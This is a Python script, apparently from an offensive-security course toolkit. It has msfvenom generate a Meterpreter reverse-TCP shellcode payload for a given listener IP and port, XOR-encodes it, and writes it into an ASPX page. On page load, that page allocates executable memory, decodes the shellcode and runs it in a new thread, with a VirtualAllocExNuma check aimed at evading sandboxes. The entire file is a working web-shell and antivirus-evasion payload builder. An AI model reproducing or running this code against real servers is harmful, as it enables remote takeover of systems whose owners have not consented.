#!/usr/bin/python3

# Original script
# From https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter-msfvenom.py
# Basic shellcode crypter for C# payloads
# By Cas van Cooten

# jan-karel changes
# limited to csharp only
# default lport= 443
# writes out csharp project and build it

from meuk.secter import *

template="""<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">

    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]  
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true,ExactSpelling = true)]   
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]  
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        
        if(mem == null)
        {
            return;
        }

        [payloadreplace]
        
        [xorreplace]

        IntPtr yolo = VirtualAlloc(IntPtr.Zero,(UIntPtr)buf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);        
        System.Runtime.InteropServices.Marshal.Copy(buf,0,yolo,buf.Length);        
        IntPtr actiezero = IntPtr.Zero;        
        IntPtr uitvoeren = CreateThread(IntPtr.Zero,UIntPtr.Zero,yolo,IntPtr.Zero,0,ref actiezero);
    }

</script>
"""


parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use", nargs='?', default="443")
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_tcp)", nargs='?', default="windows/x64/meterpreter/reverse_tcp")
parser.add_argument("key", help="the key to encode the payload with (integer)", type=auto_int, nargs='?', default=randint(1,255))
args = parser.parse_args()

# Generate the shellcode given the preferred payload
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "csharp"], stdout=subprocess.PIPE)

if result.returncode != 0:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")

# Get the payload bytes and split them
payload = re.search(r"{([^}]+)}", result.stdout.decode("utf-8")).group(1).replace('\n', '').split(",")


for i, byte in enumerate(payload):
    byteInt = int(byte, 16)
    byteInt = byteInt ^ args.key
    payload[i] = "{0:#0{1}x}".format(byteInt,4)

payLen = len(payload)
payload = re.sub("(.{65})", "\\1\n", ','.join(payload), 0, re.DOTALL)

payloadFormatted = f"byte[] buf = new byte[{str(payLen)}] {{\n{payload.strip()}\n}};"

template = template.replace('[payloadreplace]', payloadFormatted)

decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
{{
    buf[i] = (byte)((uint)buf[i] ^ {hex(args.key)});
}}"""

template = template.replace('[xorreplace]', decodingFunc)


file = open('http/payloads/meth.aspx', 'w')
item = file.write(template)
file.close()






